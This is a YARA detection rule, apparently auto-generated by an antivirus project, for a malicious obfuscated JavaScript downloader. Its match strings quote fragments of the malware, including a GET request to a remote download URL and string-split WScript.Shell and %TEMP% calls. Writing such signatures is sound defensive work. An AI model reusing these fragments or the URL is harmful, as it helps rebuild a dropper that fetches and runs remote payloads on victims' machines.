rule sig_20160427_371b7493a83e9febfb90cbead333671f {
  meta:
    description = "datamaliciousorder - file 20160427_371b7493a83e9febfb90cbead333671f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "030ba1c93958c11e4983348112a793aeb26c178e9a53586e79b05ad2607c5e63"

  strings:
    $s1  = "ZrvkuZiofj[PgtcbCtzor](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function GhophIqcrh() {return PpmktCymuo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9KqyUKv" ascii
    $s3  = "function GhophIqcrh() {return PpmktCymuo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9KqyUKv" ascii
    $s4  = "function SolbrQudbc(WilyoYzmyr, GhjymCvask){GuflvSwnsn = GuflvSwnsn * 1; return WilyoYzmyr - GhjymCvask;};" fullword ascii
    $s5  = "var PpmktCymuo = function FddecJtbrh() {return PahftFuxzc[QiieaLyejt](\"WScript\"+\".Shell\");}(), GhqcdPwxts = 11;" fullword ascii
    $s6  = "var PahftFuxzc = this[\"WScript\"];" fullword ascii
    $s7  = "function HypiyXmyjj(){return AqsplKkmxe + \"\";};" fullword ascii
    $s8  = "if (ZrvkuZiofj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function MvfdsJvguh() {return ((DqiixYxhri == true) && (DqiixYxhri == TtwggDjbyp)) ? 1 : GuflvSwnsn;};" fullword ascii
    $s10 = "function BkmfkJggpx(RlabfVweuw) {var SlqeuIpfnh = (1, 2, 3, 4, 5, RlabfVweuw); return SlqeuIpfnh;};" fullword ascii
    $s11 = "function BpesrTcdyp(){return 23;};" fullword ascii
    $s12 = "YenoqOmipe = true;" fullword ascii
    $s13 = "var DqiixYxhri = false;" fullword ascii
    $s14 = "DqiixYxhri = true; " fullword ascii
    $s15 = "function ShzhmHyyhf()" fullword ascii
    $s16 = "var PxyuwTxbxg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var TtwggDjbyp = false;" fullword ascii
    $s18 = "}while (QujuzGxywt);" fullword ascii
    $s19 = "TtwggDjbyp = true; " fullword ascii
    $s20 = "function XwdwsYckxc(){return QiieaLyejt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}